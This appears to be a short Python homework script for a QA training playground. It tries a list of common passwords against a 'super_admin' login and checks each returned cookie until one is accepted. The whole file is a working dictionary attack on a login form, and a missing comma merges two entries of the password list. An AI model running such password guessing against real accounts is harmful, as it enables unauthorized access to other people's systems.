import requests
common_pwd = ["123456",
              "123456789"
              "qwerty",
              "password",
              "1234567",
              "12345678",
              "12345",
              "iloveyou",
              "111111",
              "123123",
              "abc123",
              "qwerty123",
              "1q2w3e4r",
              "admin",
              "qwertyuiop",
              "654321",
              "555555",
              "lovely",
              "7777777",
              "welcome",
              "888888",
              "princess",
              "dragon",
              "password1",
              "123qwe"]
expected_status = "You are authorized"
url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
cookie_validator = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


def main(login_value):
    for pwd_value in common_pwd:
        data = {"login": login_value,
                "password": pwd_value}
        get_secret_password = requests.post(url, data=data)
        cookie_ = get_secret_password.cookies
        check_auth_cookie = requests.post(cookie_validator, cookies=cookie_)
        if check_auth_cookie.text == expected_status:
            return pwd_value, check_auth_cookie.text


login_value = "super_admin"
print(main(login_value))
